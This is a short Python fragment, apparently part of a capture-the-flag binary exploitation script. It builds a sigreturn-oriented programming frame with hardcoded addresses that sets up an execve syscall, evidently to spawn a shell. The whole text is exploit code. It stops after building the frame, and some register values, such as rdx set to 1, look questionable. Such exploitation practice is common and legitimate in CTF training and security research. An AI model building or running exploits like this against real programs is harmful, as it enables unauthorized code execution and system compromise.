from pwnable import *

syscall = 0x40056f

frame = srop(arch="x64")
frame.set("rax", 0x3b)
frame.set("rdi", 0x601040)
frame.set("rsi", 0x0)
frame.set("rdx", 0x1)
frame.set("rsp", 0x601040)
frame.set("rbp", 0x601050)
frame.set("rip", syscall)
srop = frame.get_srop()

